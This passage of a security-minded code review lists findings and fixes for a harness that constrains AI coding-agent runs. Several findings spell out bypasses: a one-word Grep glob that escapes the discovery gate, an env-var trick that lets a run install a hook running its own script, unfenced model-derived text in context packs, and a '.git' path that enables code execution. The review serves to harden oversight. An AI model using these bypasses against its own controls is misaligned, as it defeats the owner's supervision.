**Issue:** `invocationCostCap` returns `Math.min(perInvocation, remaining(left))`, and `remaining` is `limit - used - reserved`. It is negative once costs reported after an invocation overrun the row. `(negative * 2/3 / 0.0255) ** (1 / 1.376)` is NaN, `Math.floor(NaN)` is NaN, and `Math.max(1, NaN)` is NaN. I confirmed `knowledgeChunkLimit(-0.1)` and `knowledgeChunkLimit(NaN)` are NaN. In `selectKnowledgeCorpus`, `packDocuments(...).length > NaN` is always false, so no document is dropped as `cost-cap`. The corpus is then uncapped, in exactly the situation where no budget is left. This is the opposite of the rule's intent.

**Fix:**
```ts
export function knowledgeChunkLimit(costCapUsd: number): number {
  if (!Number.isFinite(costCapUsd) || costCapUsd <= 0) return 1;
  ...
}
```
Better, have the stage refuse the knowledge invocation when the cap is not positive.

### WR-06: Broad-discovery gate is bypassed by a Grep `glob` or `type` that matches everything (part A)

**File:** `src/domain/hook-decision.ts:149,180-182`
**Issue:** `unfiltered` for Grep is `!named(input['glob']) && !named(input['type'])`. `MATCHES_EVERY_FILE` is applied only to Glob patterns. A Grep with `glob: "*"`, `"**"`, `"**/*"` or `"*.*"` is counted as filtered, so a whole-repository search is neither refused (`BROAD_DISCOVERY_NOT_AUTHORIZED_RULE`) nor charged to `retrieval.broadDiscovery`. The model gets unlimited broad discovery with a one-word workaround. The regex also misses patterns that match everything, such as `{*,.*}`, or `*/**` with a leading `./`. The Glob side does handle `*/**`, but not the brace and `[!.]*` forms.

**Fix:** Apply the same test to the Grep glob:
```ts
const filtered = (value: unknown): boolean => named(value) && !MATCHES_EVERY_FILE.test(String(value));
if (tool === 'Grep' ? !filtered(input['glob']) && !named(input['type']) : ...) call.unfiltered = true;
```
Consider treating any pattern with a brace group as unfiltered.

### WR-07: Onboarding resume fails open when the launching host cannot be reaped (part B)

**File:** `src/app/resume.ts:35`
**Issue:** `reapInterrupted` returns `ok(undefined)` when `hostOfOnboarding(...)` is `undefined` or has no `reap`. Phase 04 made that reachable on a deployment: a restricted onboarding maps to `deps.restrictedHost`, which is optional and, per `hostOfOnboarding`, is `undefined` when no restricted host is composed. `reapStartedLaunches` then marks every `launch:*` step `interrupted` (resume.ts:77-90) as if the host had been ended, and the stage loop relaunches beside a detached host that may still be writing. The header comment of the function says "A host that cannot be searched for or ended stops the resume", and the run-side equivalent does stop (`run-resume.ts:110` returns an `internal` error for `host?.reap === undefined`). The two resumes now disagree on the same condition.
**Fix:** Fail closed as the run side does, but only when there is a started launch that needs reaping (the caller already filtered on `started`):
```ts
if (host?.reap === undefined) return err({ kind: 'internal', cause: `the launch step of onboarding ${onboardingId} cannot be reaped: the host has no reap` });
if (typeof sessionId !== 'string' || sessionId === '') return err({ kind: 'internal', cause: `the launch step of onboarding ${onboardingId} recorded no session ID` });
```
(import `err`). Keep `ok(undefined)` only for a step that never recorded a launch.

### WR-08: An interrupted privileged action does not stop a run that is already blocked on another reason (part B)

**File:** `src/app/run-resume.ts:326`
**Issue:** `blockOnInterruptedActions` opens the permission decision, but only moves the run when `state !== 'blocked_on_decision'`. A run already `blocked_on_decision` with reason `decision` (an answered item decision) keeps that reason. `isBlockedRunContinuable` (`run-stages/schedule.ts:37`) continues exactly such a run when `readyItems(...).length > 0 || no open decisions` (`domain/work-items.ts:102`), so a ready item lets the supervisor go on while the interrupted-action decision is still open. The comment above the function says the `enforcement_failure` reason is what keeps the supervisor from continuing "beside an open decision about an action nobody can vouch for"; that only holds when the run was not already blocked. `blockOnChangedRefs` handles the same situation correctly (pauses, then re-blocks with its own reason), so the two are inconsistent.
**Fix:** Mirror `blockOnChangedRefs`: when the state is `blocked_on_decision` and `reason !== 'enforcement_failure'`, transition to `paused` (`'reconcile'`) and then to `blocked_on_decision` with `reason: 'enforcement_failure'`; return `true` immediately only when the reason already is `enforcement_failure`.

### WR-09: The no-replay rule is not enforced by the approval gate (part B)

**File:** `src/app/authorize.ts:86-156` (and `finishPrivilegedAction`, `src/app/authorize.ts:176-191`)
**Issue:** The module header states that a privileged action whose start was recorded and whose end was not "is never run again", but `authorizeAction` never looks at open starts: on the policy-allow and contract paths (`recordStart`, lines 104-124) it appends a new `action.started` unconditionally. The rule is held only by the single caller (`stages/promote.ts` `alreadyAttempted`). Any future caller (the module is written for runs and attended sessions) gets replay for free. Related: `openSteps` closes an `action.finished` against the earliest open start of the same action name, ignoring parameters and the start's seq (`authorize.ts:165`), and `action.finished` carries no `startSeq`. If an earlier start of action A (params X) is left open and a later start of A (params Y) finishes, the earlier start is closed and the completed one is reported as interrupted by the next resume, with the wrong `paramsSummary` in the permission decision.
**Fix:** In `authorizeAction`, before `recordStart`, call `openSteps(listActionEvents(scope))` and deny (rule `interrupted-action-open`) when an open start has the same action and `paramsDigest`. Have `authorizeAction` return `startSeq` (already done) and make `finishPrivilegedAction` take it, writing `startSeq` into the `action.finished` data so `openSteps` closes that exact start instead of the earliest one by name.

### WR-10: Path-scoped map falls back to the full read scope instead of failing (part B)

**File:** `src/app/invocation.ts:107-111`
**Issue:** The narrowing for a `paths` refresh applies only when `scopePaths.length > 0 && scopePaths.every(isScopePath)`. Otherwise `effectiveContract` is the unmodified `contract.value.body`, i.e. the whole-repository read scope. `loadMappingPlan` also silently drops non-string entries from `paths` (`stages/shared.ts:111`). A mapping plan in `paths` mode whose list is empty, damaged or contains one path that fails `isScopePath` therefore gets a wider scope than the plan asked for, with no error (T-04-35 says a scoped map reads its scope only). The comment above says "narrowed"; the fallback is fail-open.
**Fix:** When `mappingPlan.value?.mode === 'paths'`, refuse unless the list is non-empty and every entry passes `isScopePath`:
```ts
if (mappingPlan.value?.mode === 'paths' && !(scopePaths !== undefined && scopePaths.length > 0 && scopePaths.every(isScopePath))) {
  return err({ kind: 'invalid', field: 'mapping:plan', reason: 'a path-scoped map names no valid scope path; it was not launched' });
}
```

### WR-11: The whole-file read caps are not enforced by anything a run does (part B)

**File:** `src/app/retrieval-guard.ts:88`
**Issue:** `beginRead` (the guard for `retrieval.fullReads` and `retrieval.fullReadBytes`) has no caller outside tests; `queryContext` never reads whole files and the hook charges reads to `toolCalls` only. The two budget rows are created for every run (`budget.ts:86-87`) and never spent, yet the contract, `doctor` and the file header present them as enforced caps (CON-11). This is already recorded in `docs/system/findings.md:283`; it is listed here because the contract and budget rows advertise a bound that does not exist, so it should not ship as "enforced" without that finding being resolved or the rows being marked unenforced.
**Fix:** Either wire the Read path (the hook or the host adapter) to `beginRead` for the run's guard, or drop the two rows and the contract fields until a reader exists, and state in the contract that only `searches` and broad discovery are counted.

### WR-12: A restricted run whose host leaves an unreadable or oversize output aborts the stage after the host ran, and every resume launches the host again (part C)

**File:** `src/app/run-stages/restricted.ts:278-301` (also `:285-291` and `:100-107`)
**Issue:** After the host has returned and its invocation is settled (unit, time and cost spent), the outputs are read with `workspace.readText(...)` and `workspace.patch(...)`, and each failure is returned with `if (!x.ok) return x`. The host is by definition uncontained, so these failures are reachable by the thing being distrusted. `readConfinedFile` returns `invalid` for a file over `MAX_OUTPUT_BYTES` (256 KiB) or a non-regular file, and `denied` for a symlink that leaves the clone. `workspace.patch` returns a failure when the git output exceeds the runner's buffer or timeout. `storeOutput` can fail on the artifact quota. The patch is also not capped at all (`MAX_OUTPUT_BYTES` applies only to the plan and the questions).

The error propagates to `runRun`, which returns it with the run still in `contract_ready`. `RESTRICTED_OUTPUTS_STEP` is never recorded, so on resume `runRestrictedItem` finds no `done` step, calls `resetClone` and launches the host again. Each cycle spends another invocation and fails the same way until a budget runs out. A model that happens to write a `PLAN.md` over 256 KiB gets the same result.

**Fix:** Treat an unreadable or over-limit output as a finding to record, not a stage error. Keep the invocation outcome, store what could be read, and put the failure in the block text. For example:
```ts
const planText = workspace.readText(clone, RESTRICTED_PLAN_FILE, MAX_OUTPUT_BYTES);
const problems: string[] = [];
if (!planText.ok) problems.push(`the plan could not be read (${planText.error.kind})`);
else if (planText.value !== null && planText.value.trim() !== '') { /* store */ }
// same for the patch (cap its length first) and the questions; then always record
// RESTRICTED_OUTPUTS_STEP (with `problems`) and call blockWithOutputs so the run ends blocked.
```
Reserve returning an error for failures of the ledger or artifact bookkeeping, and record the step before any later failure so a resume finishes the block instead of re-launching.

### WR-13: The restricted patch is never checked against the contract's write scope, although the owner is told to `git apply` it (part C)

**File:** `src/app/run-stages/restricted.ts:285-291` and `:144-162`
**Issue:** A contained run checks every changed path against `contract.files.write`, `create`, `delete` and `protected` (`item.ts` around lines 345, 1464 and 1715) before anything is kept. A restricted run exists because its host's enforcement cannot be relied on, yet the supervisor does no post-hoc check. The write set appears only as advice in `restrictedPrompt` ("Edit only files under these paths"). The patch is the clone's full diff against the pin, minus `.avarice-restricted`. If the host edits a protected path such as CI configuration, an instruction file or a secret-bearing path, the patch is stored and described as the thing to apply. `ISSUE_ENDING` tells the owner to `git apply` it by hand, and the block text does not mention that any path is outside the scope.

**Fix:** Compute the changed paths with `workspace.status(clone)` (already used by `resetClone`) and compare them with `matchesAny` against `contract.files.write` and `create`, and against `protected`. Name the out-of-scope paths in the issue text, or leave them out of the stored patch with `workspace.patch` excludes. Record the finding as an event, as the contained path does.

### WR-14: A kill between activation and the start of a requested promotion leaves it neither done nor reported (part C)

**File:** `src/app/stages/promote.ts:76-86` (the trigger is `src/app/onboarding-service.ts:152`, the resume side is `src/app/resume.ts:187-194`)
**Issue:** Promotion is run by `planningReadyStage` only, in the same lease right after `activateStage` commits `active`. `active` is a stop state, and `resumeOnboarding` handles an active onboarding only when `openPrivilegedSteps` finds a started and unfinished action. If the process dies after the activation commit and before `authorizeAction` records `action.started` (including a failure in `acceptedFiles` or `authorizeAction` themselves), there is no `promote` step and no start event. The onboarding is `active`, `delivery.promote` is `copy` or `commit`, and nothing ever runs or records it. The owner sees an active onboarding and a promotion that silently never happened. Re-running `avarice onboard` starts a new refresh, not this promotion. This is the case "never started" that `alreadyAttempted` is built to distinguish, but nothing calls the stage for it.

**Fix:** Let resume of an `active` onboarding whose contract asks for promotion and that has neither a `promote` step nor an `action.started` event run `promoteStage` under the lease. It is safe because `alreadyAttempted` already refuses a recorded start. For example, in `resumeOnboarding` take the `active` branch also when `!alreadyAttempted(...)` and the contract's `delivery.promote !== 'none'`, with a prelude that calls `promoteStage`.

### WR-15: Bindings registry write is an unlocked read-modify-write; concurrent writers drop a binding (part D)

**File:** `src/adapters/fs/profile-bindings.ts:143-167` (and `backfillBindings`, lines 111-131)
**Issue:** `writeBinding` reads the whole registry, appends one entry, and renames a temporary file over `bindings.json`. The rename is atomic, but nothing serializes two processes. If process A and process B both read the registry before either renames, the later rename discards the earlier one's entry. The file header says a missing entry would "silently let a bound repository open under another profile". A lost entry is exactly that outcome, and it is reachable when two `avarice` commands first-bind different repositories at the same time (for example a scheduled digest and an interactive init). `backfillBindings` repeats the read-modify-write once per project, which widens the window. There is also no `fsync` of the temporary file before the rename, so a crash can leave a zero-length `bindings.json`, which then fails `readBindings` as invalid JSON and blocks profile selection.
**Fix:** Serialize the update with an exclusive lock file (`openSync(path + '.lock', 'wx')`, removed in `finally`, with a bounded retry), and re-read the registry after taking the lock. Write the temporary file through an fd, call `fsyncSync(fd)`, then rename:
```ts
const lock = acquireLock(`${path}.lock`);   // O_EXCL, retry up to ~2 s
try {
  const existing = readBindings(configHome);   // re-read under the lock
  // ... same checks ...
  const fd = openSync(temp, 'wx', 0o600);
  try { writeSync(fd, body); fsyncSync(fd); } finally { closeSync(fd); }
  renameSync(temp, path);
} finally { releaseLock(lock); }
```

### WR-16: `cmd:` provider rejects a good credential when the helper's stderr is large (part D)

**File:** `src/adapters/credential/cmd.ts:71`
**Issue:** The provider treats `result.truncated` as "the helper printed more than 16 KiB on stdout" and returns `invalid`. In `sandboxed-executor.ts:206` that flag is `stdout.truncated || stderr.truncated`, and `outputLimitBytes` applies per stream. A helper that prints a short token on stdout but more than 16 KiB of diagnostics on stderr (a verbose `op`, `vault` or `aws` wrapper) is reported as having printed an oversized credential, and the resolve fails. The comment says stderr is "never read", but it still decides the outcome. This is a spurious failure with a misleading message, and the owner cannot tell why the credential will not resolve.
**Fix:** Decide oversize from stdout alone. Stdout is cut at the limit and ends with `TRUNCATION_MARKER`, so test for that marker, or compare `Buffer.byteLength(result.stdout)` with the limit:
```ts
import { TRUNCATION_MARKER } from '../../ports/command-executor.ts';
if (result.stdout.endsWith(TRUNCATION_MARKER)) return err({ kind: 'invalid', field: 'value', reason: `the helper printed more than ${HELPER_OUTPUT_LIMIT_BYTES} bytes` });
```
A cleaner fix is to expose per-stream truncation on `CommandResult`.

### WR-17: Profile registry skips a profile config it could not read, so that profile's moved roots are not denied (part D)

**File:** `src/adapters/fs/profile-registry.ts:51-52`
**Issue:** The header says "A deny list that could not be computed must not read as an empty one", and an unreadable profiles directory is correctly `unavailable`. A per-profile config that fails to read is silently skipped (`if (!config.ok) continue;`), and `readProfileConfig` fails with `unavailable` for `EACCES`, `EIO` and similar errors as well as `invalid` for a bad file. A profile whose data root or work root was moved off the default parents and whose `config.json` cannot be read therefore has its roots left out of the sandbox deny list, and the sandbox no longer isolates that profile from the selected run. Skipping a corrupt (`invalid`) file is a documented choice. Skipping an `unavailable` one contradicts the stated invariant.
**Fix:** Skip only `invalid`; propagate `unavailable`:
```ts
if (!config.ok) {
  if (config.error.kind === 'unavailable') return config; // a deny list that could not be computed
  continue;
}
```

### WR-18: A code node's graph excerpt carries untrusted neighbour IDs and descriptions but is not marked untrusted (part E)

**File:** `src/adapters/context/gsd-graph.ts:61` (also `:82` and `:172`)
**Issue:** `describeNeighbour` returns the raw `clip(id)` of the far node whenever the edge relation's rule is `id-only`. That covers `references`, `uses`, `cites`, `rationale_for`, `conceptually_related_to` and every relation the table does not list. Those edges typically lead to document or concept nodes, whose IDs are slugs of text from documents or from a model reading them. The comment on `neighbourName` (line 51) states the intent, that non-code text is printed "only in that node's own (fenced) entry", and the pre-phase code honoured it by naming such neighbours by kind. The new `id-only` branch bypasses it.

Separately, `excerptOf` prints `clip(node.description)` for code nodes (line 82). Only `node.fileType !== 'code'` sets `untrusted: true` (line 172). The excerpt of a code node is therefore printed unfenced by `src/app/context.ts` (the `item.untrusted === true` branch) while embedding up to 300 characters of attacker-influenced text per neighbour, up to 5 neighbours.

**Fix:** Mark the handle untrusted whenever the excerpt includes any text that is not a code label. In `find`:
```ts
const showsForeignText = node.description !== null || edges.some((e) => (e.source === node.id || e.target === node.id) && ruleAt(e, node.id) === 'id-only');
...(node.fileType !== 'code' || showsForeignText ? { untrusted: true } : {}),
```
Alternatively, for `id-only` edges print the neighbour's kind (`neighbourName`) when it is not a code node, and keep the raw ID only for code nodes.

### WR-19: `gsd-intel` excerpts are never marked untrusted (part E)

**File:** `src/adapters/context/gsd-intel.ts:90`
**Issue:** The handle at lines 90-96, and the item built in `read`, never set `untrusted`. The excerpt is `JSON.stringify` of the intel entry value (lines 34-37). The `file-roles.json` and `api-map.json` entries hold free-text roles and descriptions that GSD's intel pass derived by a model reading the repository, and `.planning/intel/*.json` can also be committed in a hostile repo. The port defines `untrusted` as "Text that came from a document or from a model reading one" (`src/ports/context-source.ts:72`). `gsd-planning`, `git-files` and the non-code graph nodes all set it, so this adapter is the inconsistent one. Its title (`entry.key`) and excerpt reach the pack printed as plain text, not fenced.

**Fix:** Set `untrusted: true` on every handle and item this adapter returns, as `gsd-planning` does:
```ts
const handle: ContextHandle = { ref, title: entry.key, estTokens: ..., reason: ..., readRule: 'id-only', untrusted: true };
...
items.push({ ..., untrusted: true, ...});
```
Carry `untrusted` through in `read`.

### WR-20: `gsd-planning` `refresh` reads through intermediate symbolic links, contradicting the adapter's stated guarantee (part E)

**File:** `src/adapters/context/gsd-planning.ts:229-233`
**Issue:** The header (lines 7-9) says every read "walks only real directories under the staging copy, so a planted link cannot lead the adapter outside it". `find` honours this (`currentPhaseDirectory` and `planningFiles` check `isRealDirectory`). `refresh` does not. It validates the lexical form of `ref.id` (`phases/<dir>/<file>`) and then calls `readRegular(join(root, file), ...)`. `readRegular` only uses `O_NOFOLLOW` on the last path component. If `.planning/phases` or `.planning/phases/<dir>` in the (hostile) staging copy is a symbolic link to a directory outside it, `refresh` opens and parses a file outside the staging copy and answers `deleted`, `fresh` or `stale` depending on whether a section with that slug exists there. This is a boolean existence oracle for files outside the staging copy, not content disclosure, but it breaks the documented confinement.

**Fix:** Check each directory component before reading, as `find` does:
```ts
const dirs = file.split('/').slice(0, -1);
let dir = root;
for (const part of dirs) {
  dir = join(dir, part);
  if (!isRealDirectory(dir)) return settled('deleted');
}
```

### WR-21: Excluded read directories are only excluded at the repository root (part E)

**File:** `src/adapters/context/git-files.ts:46-50`
**Issue:** `inScope` builds the exclusion list as each `readExclude` entry plus `${entry}/**`, then tests it with `matchesAny`. `globToRegExp` anchors every glob at the start of the path, so `node_modules/**` matches `node_modules/x` but not `packages/app/node_modules/x`. The onboarding preset excludes `build`, `coverage`, `dist`, `node_modules` and `vendor`, and a contract's `files.readExclude` is described as "directories or globs" (`src/domain/context-adapters.ts:47`). A nested `services/api/vendor/...`, `packages/x/dist/...` or `config/secrets/...` therefore passes the scope check and its snippets can reach a pack. Only a root-level directory is excluded. If root anchoring was intended, nothing documents it. If it was not, it is a gap in the read scope that this adapter is the only enforcer of for search hits.

**Fix:** Treat a plain directory name as matching at any depth, and keep glob entries as written:
```ts
const dirForms = scope.readExclude.flatMap((entry) => (/[*?]/.test(entry) ? [entry] : [entry, `${entry}/**`, `**/${entry}/**`]));
const excluded = [...dirForms, ...scope.secretGlobs];
```
Or document and test that exclusions are root-anchored.

### WR-22: Promotion path check admits `.git` segments and non-canonical paths at the one boundary that writes to the user's checkout (part E)

**File:** `src/adapters/git/promotion.ts:31-48` (used at `:86-125`)
**Issue:** `checkPromotionPath` allows any segment matching `/^[A-Za-z0-9._-]+$/` under `.planning/`. That includes a segment named `.git` (any case) and segments such as `...`. `copyIntoCheckout` then creates the directories and file in the user's working tree with `ensureConfinedDir` and `createExclusive`. A file such as `.planning/codebase/.git/HEAD` plus `.git/config` would create an embedded repository inside the owner's checkout. The owner running git in that directory would load its configuration (`core.fsmonitor` and similar), so it is a code-execution vector if an accepted-map path ever contains `.git`. The sibling checkers reject it (`checkCommitPath` and `checkParkPath` in `run-workspace.ts` reject any `.git` segment). `commitPromotion` is safe because git refuses `.git` components in the index, but copy mode has no such backstop. The upstream source (accepted record) likely only yields `.planning/codebase/*.md`, so this is defence in depth, but this module is documented as the only code that writes to the user's checkout.

The check also does not require the normal form. `checkRelative` silently drops empty and `.` segments, so `.planning//a.md` and `.planning/a.md` both pass and are not seen as duplicates by `checkFiles` (it compares the raw strings). A trailing slash makes `createExclusive` fail with `ENOENT`/`ENOTDIR` mid-run, and `update-index --cacheinfo` rejects `//` after the staging clone's object store was already written to.

**Fix:**
```ts
if (segments.value.some((s) => s.toLowerCase() === '.git' || /^\.+$/.test(s))) return invalid('files', `${JSON.stringify(path)} names a path a promotion does not write`);
if (segments.value.join('/') !== path) return invalid('files', `${JSON.stringify(path)} is not in normal form`);
```

### WR-23: `patch()` returns a lossy UTF-8 decoding of a binary-capable diff (part E)

**File:** `src/adapters/git/run-workspace.ts:663-675` (decoding in `src/adapters/git/safe-git.ts`, `spawnGit` with `encoding: 'utf8'`)
**Issue:** `patch` runs `git diff --binary` and returns `diff.value.stdout`, which `runGit` has decoded as UTF-8. `--binary` only base85-encodes files git treats as binary (those containing NUL). A text file in a legacy encoding (for example Latin-1 bytes) is emitted raw, and decoding turns each invalid byte into U+FFFD. The caller (`src/app/run-stages/restricted.ts:285`) stores the string as the run's patch artifact for the owner to review and apply. A patch that touches such a file will not apply, or will apply different bytes, and nothing reports it. CRLF and Unicode normalisation are preserved, so only non-UTF-8 content is affected.

**Fix:** Let `runGit` return bytes for this call (an `encoding: 'buffer'` option) and store the `Uint8Array`. Or have `patch` detect `�` in the output and return an error naming that the diff contains non-UTF-8 content, rather than a corrupt patch.

### WR-24: `install-host` refuses only on the AVARICE_RUN variable, not on a run's process tree, although it now writes an executable hook entry (part F)

**File:** `src/cli/commands/install-host.ts:32-38` (and `run()` at 52-98)
**Issue:** This phase made `install-host` write a `PreToolUse` hook entry (a command line that node executes, including `AVARICE_HOOK_ENTRY` taken from the environment) into `<claude config dir>/settings.json`. Its `usage()` still refuses only when `AVARICE_RUN` is set. Every other command that must not be driven by a run (`approve`, `schedule` via `refuseOutsideTerminal`; `evidence add`, `pr record`, `context add` via `refuseInsideRun`) also checks `inRunProcessTree(context.ancestry())`, which survives `env -u AVARICE_RUN`. A process of a run can therefore unset the variable and run `avarice install-host --config-dir <dir>` with `AVARICE_HOOK_ENTRY=<its own script>`, adding an entry that executes that script on the owner's attended Bash calls. Whether the run's sandbox allows the write to the Claude config directory is the only remaining barrier. Defense in depth is missing exactly where this phase raised the stakes.
**Fix:** Take the identity context and apply the same refusal as the sibling commands:
```ts
import { refuseInsideRun } from '../identity.ts';
import type { IdentityContext } from '../identity.ts';

export function usage(args: ParsedArgs, env: NodeJS.ProcessEnv = process.env, context?: IdentityContext): string | undefined {
  const refused = refuseInsideRun(env, context);
  if (refused !== undefined) return refused;
  // ...existing argument checks
}
```

### WR-25: `install-host` writes a hook entry that blocks on failure without checking that the hook script exists (part F)

**File:** `src/cli/commands/install-host.ts:46-50, 76`; `src/adapters/host-claude/attended-hook-install.ts:92-95` (only `isAbsolute` is checked)
**Issue:** `hookEntryOf()` returns `resolve($AVARICE_HOOK_ENTRY)` or this checkout's `src/hook/pre-tool-use.ts`, and `installAttendedHook` only verifies that the path is absolute. The entry is written with `onFailure: 'block'` and `process.execPath` baked in. A typo in `AVARICE_HOOK_ENTRY`, an install from a checkout or cache that is later moved or deleted, or a node binary replaced by a version manager makes the hook fail, and every Bash tool call in the owner's attended Claude sessions is then blocked, with `install-host` having reported success. `doctor --extensions` counts entries but does not check that the target is runnable.
**Fix:** Before writing, refuse (exit 3) when `hookEntry` is not a readable regular file, and have `doctor --extensions` flag an attended entry whose script or node path no longer exists:
```ts
import { statSync } from 'node:fs';
const entryPath = hookEntryOf();
try { if (!statSync(entryPath).isFile()) throw new Error('not a file'); }
catch { io.err(`${errorLine('install-host', `the hook entry ${stripControl(entryPath)} is not a readable file; nothing was written to settings.json`)}\n`); return EXIT_REFUSED; }
```
Do this before `installSkill` as well, so a refusal leaves nothing half-installed.

### WR-26: A corrupt binding or enterprise-pattern registry makes `avarice doctor` exit 3 before it can diagnose anything (part F)

**File:** `src/cli/main.ts:146-151` (calls `readRepositoryContext`); `src/cli/profile-gate.ts:31-34`
**Issue:** `main()` reads the repository context (bindings file and enterprise `remotePatterns`) for every command, including `doctor`, before the `composeDoctor` branch. `readRepositoryContext` turns an invalid registry into a refusal (exit 3, or 70 for an unreadable one). `doctor` exists to "report the problems the normal composition would refuse to start on" (its own header), yet a malformed `profile-bindings` file or enterprise config is exactly such a problem and stops `doctor` with a one-line error, with no finding and no fix text. The same ordering also means `doctor --profile typo` first creates the typo profile's directories (documented) only after the gate passes.
**Fix:** Skip the repository gate for a module that supplies its own composition, or let it degrade to a finding:
```ts
const own = (mod as { composeDoctor?: ... }).composeDoctor;
const repository = typeof own === 'function'
  ? ({ ok: true, value: {} } as const)
  : readRepositoryContext(env, mod.repository?.(args), process.cwd());
```
and have `app/doctor.ts` read the registry itself and report an unreadable one as an error finding.

### WR-27: `approve` reports a missing approval request as "no such approval" (part F)

**File:** `src/cli/commands/approve.ts:56-60` (caller at 91-92)
**Issue:** `fail()` picks the noun with `error.ref.startsWith('approval ')`, intending to separate `approval apv_...` (revoke) from `approval request apr_...`. The not-found ref built in `run()` is `approval request ${named}`, which also starts with `approval `, so a mistyped request ID prints `no such approval (...)` instead of `no such approval request (...)`. The distinction is never exercised by a test (`grep "no such approval" test` finds nothing).
**Fix:**
```ts
const noun = error.ref.startsWith('approval request ') ? 'approval request' : 'approval';
io.err(`${errorLine('approve', `no such ${noun} (${describeError(error)})`)}\n`);
```

### WR-28: AC-8 summary counts infrastructure failures as task failures and ignores `tokensComplete`, contradicting the documented judge-error semantics (part G)

**File:** `scripts/eval-retrieval.ts:327-350` (also `:515-516`, `:844`, `:853`, `:562-563`)
**Issue:**

- `JudgeResult.error` is documented as "the task is then neither a pass nor a failure of the arm". `summarize()` does the opposite. Every run, whatever its state, adds to `runs`, which becomes `tasks` in `ArmTotals`, and a run with `success:false` is a failure. A `judgeError` is only counted in `judgeErrors`, which no rule reads.
- Runs that never reached the model's task (`map-failed`, `onboarding-failed`, `not-started`, `judge-unavailable`, `dependencies-missing`) are scored as failures with 0 tokens.
- The failure modes are asymmetric. Only arm A has a map-generation step (`:835-846`), so an infrastructure failure there lowers A's success rate and its token total. That makes `rateOf(B) >= rateOf(A)` easier to satisfy, which biases the AC-8 verdict toward a pass.
- `RunResult.tokensComplete` is computed by `costsOf` but `summarize` never reads it. A run with an invocation that lacked `tokens` contributes a partial (understated) token count, so an arm can look cheaper than it was and pass the "half of A's tokens" test.

**Fix:** Exclude runs whose state is an infrastructure outcome, or whose `judgeError` is set, from `runs`, `success` and `tokens`. Report them separately, and refuse or flag a verdict when any included run has `tokensComplete === false`. For example:

```ts
const own = results.filter((r) => r.arm === arm);
const scored = own.filter((r) => r.judgeError === undefined && !INFRA_STATES.has(r.state));
// totals from `scored`; keep `own.length - scored.length` as `excluded`
// verdict(): if any scored run has tokensComplete === false, return { pass: false, reason: 'token counts are incomplete' }
```

`RunSummaryInput` must also carry `state` and `tokensComplete`.

### WR-29: Token comparison uses raw totals while success uses rates; unequal task counts make the AC-8 token test and the D-08 rule wrong (part G)

**File:** `scripts/eval-retrieval.ts:279-280` (`verdict`), `:297-299` (`knowledgeRule`)
**Issue:** `successOk` switches to per-task rates when every arm states its `tasks` count, but `tokensOk = arm.tokens * 2 <= a.tokens` and `costsMore = c.tokens > b.tokens` always compare totals. The harness allows differing counts: `--arms`, `--task-ids`, `--merge`, and ceiling/exception stops all leave arms with different numbers of runs. With B at 10 runs and A at 20, B's total tokens are about half of A's by construction, so `tokensOk` passes. D-08 has the same problem: an arm that ran fewer tasks looks cheaper.
**Fix:** When `usesRates(...)` is true, compare tokens per run (`tokens / tasks`) in both functions, or refuse a verdict unless every compared arm has the same `tasks`.

```ts
const per = (x: ArmTotals) => (byRate && x.tasks ? x.tokens / x.tasks : x.tokens);
const tokensOk = per(arm) * 2 <= per(a);
```

### WR-30: `spendStep` can under-record (or lose) the spend of a step that really ran (part G)

**File:** `scripts/eval-retrieval.ts:800-807`
**Issue:** The recorded amount is `costs.finished > 0 ? costs.chargedUsd : (result.code === null ? capUsd : 0)`. Three paths under-record:

1. The step was killed by the timeout (`code === null`) after one invocation finished and another was in flight. `finished > 0`, so only the finished invocation is charged and the in-flight one is dropped.
2. The CLI ended non-zero after the host started but before an `invocation.finished` event (`code !== null`, `finished === 0`). The step records 0.
3. `costsOf()` throws (corrupt `data_json`, locked or unreadable db). This happens after `fn()` already spent, so the exception propagates before `recordPhase4Spend` and the spend never reaches the ledger.

The ledger is the only thing enforcing the 40 USD ceiling, so each of these silently relaxes it.
**Fix:** Record conservatively.

```ts
let costs: LedgerCosts;
try { costs = costsOf(...); } catch { costs = { chargedUsd: 0, tokens: 0, finished: 0, tokensComplete: false }; }
const floor = result.code === null || costs.finished === 0 ? capUsd : 0;   // unknown => the cap
const spent = Math.max(costs.chargedUsd, floor);
```

If the harness cannot tell whether the host ran, it should charge the cap, as the Phase 3 tools did.

### WR-31: AC-14 `run-one` records 0 spend when the ledger read fails, and under-records partially reported costs (part G)

**File:** `scripts/exit-run-phase4-tools.ts:877-890` (`ledgerFacts` `:750-753`)
**Issue:** `facts` defaults to `{ hostStarted:false, costUsd:0 }` when `root === undefined` (profile config unreadable) or when `ledgerFacts` throws (`ledgerError`). `costUsd = hostStarted ? ... : 0`, so a live onboarding that ran and spent is recorded as free. When some invocations report no cost, `costAssumed` is true but the cap is applied only if the sum is exactly 0 (`:889`). With one reported 0.3 USD invocation and one unreported, the unreported one is counted as 0. The tool also sums the host-reported `costUsd`, not `costChargedUsd` (what the budgets charged, larger for a killed run), which is what `eval-retrieval.ts` reads precisely for this reason. Timeout (`ran.status === null`) with no event rows also records 0.
**Fix:**

```ts
const unknown = ledgerError !== undefined || root === undefined || ran.status === null || facts['hostStarted'] !== true && ran.status !== 0;
const costUsd = unknown ? perRepo : facts['costAssumed'] === true ? Math.max(perRepo, reported) : reported;
```

Sum `costChargedUsd` (falling back to `costUsd`) in `ledgerFacts`.

### WR-32: A completed, paid run is discarded, and the whole evaluation halts, when judge preparation throws (part G)

**File:** `scripts/eval-retrieval.ts:872-875` (caller `:1179-1190`)
**Issue:** After the `start` step has spent, `prepareJudgeClone` (git clone/show) and `judgeClone` (`cpSync` of node_modules, mkdir, sandbox spawn) run unguarded. Any exception (a missing held-out path at the target commit, a failed `cpSync`, a full disk) leaves `runOne` through `finally`, and `main` sets `stopped`, never pushes the result and breaks the loop. The spend is already in the Phase 4 ledger, but the results file has no run for that (task, arm). `--merge` then treats the pair as not done and pays for it again. `judgeClone` explicitly models `error` for "judge could not run", but only for the returned-error path, not for exceptions.
**Fix:**

```ts
let judge: JudgeResult;
try {
  prepareJudgeClone(...);
  judge = await judgeClone(...);
} catch (e) {
  judge = { success: false, checks: [], error: `judge-exception: ${(e as Error).message}` };
}
return { ...result, success: judge.success, judge, ...(judge.error ? { judgeError: judge.error } : {}) };
```

This keeps the paid run in the results, where WR-01 then excludes it from the verdict.

### WR-33: `eval-retrieval.ts --live` has no owner-authorization gate; the ceiling is the only guard (part G)

**File:** `scripts/eval-retrieval.ts:1143-1164`, `:18-19`
